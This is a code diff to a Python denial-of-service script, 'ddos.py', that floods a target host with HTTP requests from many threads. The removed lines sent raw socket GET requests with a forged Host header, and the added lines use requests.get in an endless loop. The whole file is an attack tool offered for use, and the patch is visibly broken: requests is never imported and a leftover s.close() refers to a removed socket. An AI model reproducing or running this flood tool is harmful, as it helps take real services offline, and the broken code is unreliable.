@@ -1,4 +1,4 @@
-import socket, threading, sys, time
+import threading, sys, time
 from colorama import Fore
 
 try:
@@ -7,22 +7,17 @@ try:
 except:
 	print(f"{Fore.RED}Error!{Fore.RESET}")
 	print(f"{Fore.CYAN}Using: {Fore.GREEN}ddos.py [TARGET] [COUNT]{Fore.RESET}")
-	print(f"{Fore.CYAN}Example: {Fore.GREEN}ddos.py example.com 500{Fore.RESET}")
+	print(f"{Fore.CYAN}Example: {Fore.GREEN}ddos.py example.com 1000{Fore.RESET}")
 	sys.exit(1)
-fake_ip = '182.21.20.32'
-port = 80
 attack_num = 0
 
 def attack():
     while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+	r = requests.get(target)
         
         global attack_num
         attack_num += 1
-        print(f"{Fore.YELLOW}Attack №{attack_num}!{Fore.RESET}")
+        print(f"{Fore.YELLOW}Attack №{attack_num}!{Fore.RESET} - {Fore.GREEN}{r.status_code}")
         
         s.close()
 
@@ -34,5 +29,5 @@ if __name__ == '__main__':
 		    thread = threading.Thread(target=attack)
 		    thread.start()
 		except:
-			print(f"{Fore.RED}Error №{attack_num}!{Fore.RESET}")
+			print(f"{Fore.RED}Error!{Fore.RESET}")
 			continue
